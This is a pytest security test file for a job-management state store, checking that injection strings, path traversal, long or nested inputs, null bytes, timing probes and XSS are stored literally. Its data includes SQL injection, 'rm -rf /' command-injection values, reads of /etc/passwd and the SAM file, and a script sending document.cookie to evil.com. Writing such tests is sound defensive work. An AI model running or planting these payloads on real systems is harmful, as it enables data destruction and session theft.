"""
Security and Abuse Tests for Job Management.

Tests system resilience against:
1. Injection attacks
2. Resource exhaustion attempts
3. Data validation bypass
4. Rate limiting / abuse scenarios
"""
import pytest
import json
from datetime import datetime, timezone
from pathlib import Path

from backend.app.repositories.state.store import StateStore


@pytest.fixture
def state_store(tmp_path: Path, monkeypatch) -> StateStore:
    """Create a temporary StateStore for testing."""
    monkeypatch.delenv("NEURA_STATE_DIR", raising=False)
    return StateStore(base_dir=tmp_path)


# =============================================================================
# Injection Attack Tests
# =============================================================================

class TestInjectionAttacks:
    """Tests for injection attack resilience."""

    def test_sql_injection_in_idempotency_key(self, state_store: StateStore):
        """SQL injection attempts in idempotency key should be safe."""
        malicious_keys = [
            "'; DROP TABLE jobs; --",
            "1' OR '1'='1",
            "1; DELETE FROM idempotency_keys WHERE '1'='1",
            "UNION SELECT * FROM users--",
            "' OR 1=1--",
        ]

        for key in malicious_keys:
            # Should store and retrieve without issues
            state_store.store_idempotency_key(key, "job-1", "hash", {"status": "ok"})
            exists, cached = state_store.check_idempotency_key(key, "hash")

            assert exists is True, f"Failed for key: {key}"
            assert cached == {"status": "ok"}

    def test_sql_injection_in_job_id(self, state_store: StateStore):
        """SQL injection attempts in job_id should be safe."""
        malicious_ids = [
            "'; DROP TABLE jobs; --",
            "../../../etc/passwd",
            "${system('rm -rf /')}",
            "`rm -rf /`",
        ]

        for mal_id in malicious_ids:
            # Operations should fail gracefully
            result = state_store.get_dead_letter_job(mal_id)
            assert result is None

            result = state_store.move_job_to_dlq(mal_id)
            assert result is None

            result = state_store.requeue_from_dlq(mal_id)
            assert result is None

    def test_path_traversal_in_template_id(self, state_store: StateStore):
        """Path traversal attempts should be treated as literal strings."""
        traversal_ids = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]

        for template_id in traversal_ids:
            # Should create job without path traversal issues
            job = state_store.create_job(
                job_type="run_report",
                template_id=template_id,
            )
            assert job is not None
            assert job.get("templateId") == template_id or job.get("template_id") == template_id

    def test_json_injection_in_response(self, state_store: StateStore):
        """JSON injection attempts should be safely stored and retrieved."""
        malicious_responses = [
            {"data": '{"injected": true}'},
            {"nested": {"__proto__": {"polluted": True}}},
            {"constructor": {"prototype": {"isAdmin": True}}},
            {"key": "</script><script>alert('xss')</script>"},
        ]

        for i, response in enumerate(malicious_responses):
            key = f"json-inject-{i}"
            state_store.store_idempotency_key(key, "job", "hash", response)
            exists, cached = state_store.check_idempotency_key(key, "hash")

            assert exists is True
            assert cached == response  # Should be stored literally, not executed


# =============================================================================
# Resource Exhaustion Tests
# =============================================================================

class TestResourceExhaustion:
    """Tests for resource exhaustion attack resilience."""

    def test_very_long_idempotency_key(self, state_store: StateStore):
        """System should handle very long keys."""
        long_key = "x" * 10000  # 10KB key

        state_store.store_idempotency_key(long_key, "job", "hash", {"ok": True})
        exists, cached = state_store.check_idempotency_key(long_key, "hash")

        assert exists is True
        assert cached == {"ok": True}

    def test_very_long_job_id(self, state_store: StateStore):
        """System should handle very long job IDs gracefully."""
        long_id = "j" * 10000

        result = state_store.get_dead_letter_job(long_id)
        assert result is None

    def test_deeply_nested_response(self, state_store: StateStore):
        """System should handle deeply nested response objects."""
        # Create deeply nested structure
        nested = {"level": 0}
        current = nested
        for i in range(100):
            current["child"] = {"level": i + 1}
            current = current["child"]

        state_store.store_idempotency_key("deep", "job", "hash", nested)
        exists, cached = state_store.check_idempotency_key("deep", "hash")

        assert exists is True
        # Verify structure is preserved
        current = cached
        for i in range(100):
            assert current["level"] == i
            current = current["child"]

    def test_large_failure_history(self, state_store: StateStore):
        """System should handle large failure histories."""
        job = state_store.create_job(job_type="run_report", template_id="t1")
        state_store.record_job_completion(job["id"], status="failed")

        # Create large failure history
        failure_history = [
            {
                "attempt": i,
                "error": f"Error message {i}" * 100,  # ~1.5KB per entry
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "category": "transient",
                "details": {"large_data": "x" * 1000},
            }
            for i in range(100)
        ]

        dlq_record = state_store.move_job_to_dlq(job["id"], failure_history)

        assert dlq_record is not None
        assert len(dlq_record["failure_history"]) == 100

    def test_many_idempotency_keys(self, state_store: StateStore):
        """System should handle many idempotency keys."""
        # Create many keys
        for i in range(1000):
            state_store.store_idempotency_key(f"key-{i}", f"job-{i}", f"hash-{i}", {"i": i})

        # All should be retrievable
        for i in range(0, 1000, 100):  # Sample every 100
            exists, cached = state_store.check_idempotency_key(f"key-{i}", f"hash-{i}")
            assert exists is True
            assert cached["i"] == i

    def test_many_dlq_jobs(self, state_store: StateStore):
        """System should handle many DLQ jobs."""
        # Create many jobs and move to DLQ
        for i in range(200):
            job = state_store.create_job(job_type="run_report", template_id=f"t-{i}")
            state_store.record_job_completion(job["id"], status="failed")
            state_store.move_job_to_dlq(job["id"])

        # List should work
        jobs = state_store.list_dead_letter_jobs(limit=100)
        assert len(jobs) == 100

        # Stats should work
        stats = state_store.get_dlq_stats()
        assert stats["total"] == 200


# =============================================================================
# Data Validation Bypass Tests
# =============================================================================

class TestDataValidationBypass:
    """Tests for data validation bypass attempts."""

    def test_null_bytes_in_keys(self, state_store: StateStore):
        """Null bytes should be handled safely."""
        null_keys = [
            "key\x00with\x00nulls",
            "\x00leading",
            "trailing\x00",
        ]

        for key in null_keys:
            try:
                state_store.store_idempotency_key(key, "job", "hash", {"ok": True})
                exists, cached = state_store.check_idempotency_key(key, "hash")
                # Either works or raises, both are acceptable
            except (ValueError, KeyError):
                pass  # Acceptable to reject null bytes

    def test_unicode_normalization_attacks(self, state_store: StateStore):
        """Unicode normalization should not cause key collisions."""
        # These look similar but are different code points
        key1 = "café"  # e with acute (U+00E9)
        key2 = "cafe\u0301"  # e + combining acute (U+0065 + U+0301)

        state_store.store_idempotency_key(key1, "job-1", "hash-1", {"key": 1})
        state_store.store_idempotency_key(key2, "job-2", "hash-2", {"key": 2})

        exists1, cached1 = state_store.check_idempotency_key(key1, "hash-1")
        exists2, cached2 = state_store.check_idempotency_key(key2, "hash-2")

        # Both should exist as separate keys (or normalized consistently)
        assert exists1 is True
        assert exists2 is True

    def test_type_confusion_in_response(self, state_store: StateStore):
        """Various response types should be handled correctly."""
        test_cases = [
            ({"list": [1, 2, 3]}, "list"),
            ({"bool": True}, "bool"),
            ({"null": None}, "null"),
            ({"number": 123.456}, "number"),
            ({"nested": {"a": {"b": {"c": 1}}}}, "nested"),
        ]

        for response, key in test_cases:
            state_store.store_idempotency_key(key, "job", "hash", response)
            exists, cached = state_store.check_idempotency_key(key, "hash")

            assert exists is True
            assert cached == response, f"Failed for {key}"

    def test_empty_values_handling(self, state_store: StateStore):
        """Empty values should be handled correctly."""
        # Empty string key
        exists, cached = state_store.check_idempotency_key("", "hash")
        assert exists is False

        # Empty response
        state_store.store_idempotency_key("empty-resp", "job", "hash", {})
        exists, cached = state_store.check_idempotency_key("empty-resp", "hash")
        assert exists is True
        assert cached == {}

        # Empty hash
        state_store.store_idempotency_key("empty-hash", "job", "", {"ok": True})
        exists, cached = state_store.check_idempotency_key("empty-hash", "")
        assert exists is True


# =============================================================================
# Abuse Pattern Tests
# =============================================================================

class TestAbusePatterns:
    """Tests for common abuse patterns."""

    def test_rapid_requeue_abuse(self, state_store: StateStore):
        """System should handle rapid requeue attempts."""
        job = state_store.create_job(job_type="run_report", template_id="t1")
        state_store.record_job_completion(job["id"], status="failed")
        state_store.move_job_to_dlq(job["id"])

        # Rapid requeue attempts
        for _ in range(50):
            new_job = state_store.requeue_from_dlq(job["id"])
            assert new_job is not None

        # Count should be accurate
        dlq_record = state_store.get_dead_letter_job(job["id"])
        assert dlq_record["requeue_count"] == 50

    def test_duplicate_dlq_move_attempts(self, state_store: StateStore):
        """Moving same job to DLQ multiple times should be idempotent."""
        job = state_store.create_job(job_type="run_report", template_id="t1")
        state_store.record_job_completion(job["id"], status="failed")

        # Move multiple times
        results = []
        for _ in range(10):
            result = state_store.move_job_to_dlq(job["id"])
            results.append(result)

        # Should all succeed or all return the same record
        assert all(r is not None for r in results)

        # Only one DLQ entry should exist
        stats = state_store.get_dlq_stats()
        assert stats["total"] == 1

    def test_idempotency_key_collision_attempt(self, state_store: StateStore):
        """Same key with different hash should be detected."""
        key = "collision-key"

        state_store.store_idempotency_key(key, "job-1", "hash-A", {"original": True})

        # Attempt to use same key with different payload
        exists, cached = state_store.check_idempotency_key(key, "hash-B")

        # Should detect mismatch (exists=True, cached=None)
        assert exists is True
        assert cached is None  # Indicates hash mismatch

    def test_enumeration_attempt_via_timing(self, state_store: StateStore):
        """Check operations should not leak information via timing."""
        import time

        # Store one key
        state_store.store_idempotency_key("real-key", "job", "hash", {})

        # Time checks for existing vs non-existing keys
        times_existing = []
        times_nonexisting = []

        for _ in range(10):
            start = time.perf_counter()
            state_store.check_idempotency_key("real-key", "hash")
            times_existing.append(time.perf_counter() - start)

            start = time.perf_counter()
            state_store.check_idempotency_key("fake-key-" + str(_), "hash")
            times_nonexisting.append(time.perf_counter() - start)

        # Average times should be roughly similar (not a security guarantee,
        # but checking for obvious timing differences)
        avg_existing = sum(times_existing) / len(times_existing)
        avg_nonexisting = sum(times_nonexisting) / len(times_nonexisting)

        # Should be within an order of magnitude (not testing constant-time,
        # just that there's no obvious enumeration vector)
        ratio = max(avg_existing, avg_nonexisting) / max(
            min(avg_existing, avg_nonexisting), 0.0001
        )
        assert ratio < 100, "Significant timing difference detected"


# =============================================================================
# XSS and HTML Injection Tests
# =============================================================================

class TestXSSPrevention:
    """Tests for XSS and HTML injection prevention in stored data."""

    def test_xss_in_idempotency_response(self, state_store: StateStore):
        """XSS payloads should be stored literally, not executed."""
        xss_payloads = [
            {"message": "<script>alert('xss')</script>"},
            {"message": "javascript:alert('xss')"},
            {"message": "<img src=x onerror=alert('xss')>"},
            {"message": "<svg onload=alert('xss')>"},
            {"message": "'-alert('xss')-'"},
        ]

        for i, response in enumerate(xss_payloads):
            key = f"xss-{i}"
            state_store.store_idempotency_key(key, "job", "hash", response)
            exists, cached = state_store.check_idempotency_key(key, "hash")

            assert exists is True
            assert cached == response  # Stored literally

    def test_xss_in_template_name(self, state_store: StateStore):
        """XSS in template names should be stored literally."""
        xss_names = [
            "<script>alert('xss')</script>",
            "Template<img src=x onerror=alert('xss')>",
        ]

        for name in xss_names:
            job = state_store.create_job(
                job_type="run_report",
                template_id="t1",
                template_name=name,
            )
            assert job.get("templateName") == name or job.get("template_name") == name

    def test_xss_in_error_messages(self, state_store: StateStore):
        """XSS in error messages should be stored literally."""
        job = state_store.create_job(job_type="run_report", template_id="t1")

        xss_error = "<script>document.location='http://evil.com/?c='+document.cookie</script>"
        state_store.record_job_completion(job["id"], status="failed", error=xss_error)

        retrieved = state_store.get_job(job["id"])
        assert retrieved["error"] == xss_error  # Stored literally
